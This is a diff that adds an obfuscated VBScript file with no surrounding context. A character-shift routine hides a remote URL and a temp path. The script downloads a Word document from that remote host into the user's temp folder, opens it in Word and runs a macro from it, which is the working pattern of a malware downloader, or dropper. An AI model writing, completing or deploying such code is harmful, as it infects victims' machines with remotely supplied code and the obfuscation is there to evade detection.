@@ -1,0 +1,38 @@
+Private Function hqNvXoUbuCrXSS(RWHAHmMyORUMlOtd)
+    Dim YNiYPdnVVJvWtFT, BSEIjWTNgdAV, uAwILZvxGQLp
+    RWHAHmMyORUMlOtd = StrReverse(RWHAHmMyORUMlOtd)
+    For BSEIjWTNgdAV = 1 To Len(RWHAHmMyORUMlOtd)
+        YNiYPdnVVJvWtFT = Mid(RWHAHmMyORUMlOtd, BSEIjWTNgdAV, 1)
+        uAwILZvxGQLp = uAwILZvxGQLp & Chr(Asc(YNiYPdnVVJvWtFT) - 1)
+    Next
+    hqNvXoUbuCrXSS = uAwILZvxGQLp
+End Function
+pRlPoGRGDxPMkTekgsIJf = hqNvXoUbuCrXSS("dpe/xo10xo10vf/99wd00;quui") 
+Dim ildBQJtceybgtDYmZLnJIkRj
+Set ildBQJtceybgtDYmZLnJIkRj = WScript.CreateObject("WScript.Shell")
+Dim UYzZlfxuQmLDzKcrMzJhc
+UYzZlfxuQmLDzKcrMzJhc = ildBQJtceybgtDYmZLnJIkRj.expandEnvironmentStrings("%tmp%")
+DNTPcsHOQZxsVXEKemb = UYzZlfxuQmLDzKcrMzJhc & hqNvXoUbuCrXSS("dpe/2dpE0")
+Set FHoHNVKqzAyDbhoSgfvz = CreateObject("MSXML2.XMLHTTP")
+FHoHNVKqzAyDbhoSgfvz.open "GET", pRlPoGRGDxPMkTekgsIJf, False
+FHoHNVKqzAyDbhoSgfvz.send
+Set BtSiZKsuOrw = CreateObject("Scripting.FileSystemObject")
+If BtSiZKsuOrw.FileExists(DNTPcsHOQZxsVXEKemb) Then
+  BtSiZKsuOrw.DeleteFile(DNTPcsHOQZxsVXEKemb)
+End If
+If FHoHNVKqzAyDbhoSgfvz.Status = 200 Then
+  Dim JGpCccDLYAUzXpPqBvNwT
+  Set JGpCccDLYAUzXpPqBvNwT = CreateObject("ADODB.Stream")
+  With JGpCccDLYAUzXpPqBvNwT
+    .Type = 1
+    .Open
+    .Write FHoHNVKqzAyDbhoSgfvz.ResponseBody
+    .SaveToFile DNTPcsHOQZxsVXEKemb
+    .Close
+  End With
+  set JGpCccDLYAUzXpPqBvNwT = Nothing
+End If
+Set GCCBFrxFVwvLBEwUydbIxR = CreateObject("Word.Application")
+GCCBFrxFVwvLBEwUydbIxR.Visible = True
+Set HyMWFFstTd = GCCBFrxFVwvLBEwUydbIxR.Documents.Open(UYzZlfxuQmLDzKcrMzJhc & hqNvXoUbuCrXSS("dpe/2dpE0"))
+GCCBFrxFVwvLBEwUydbIxR.Run "UCfvciBJyfZZYeOHOtTFVYcTsVAkgUpgWkud"
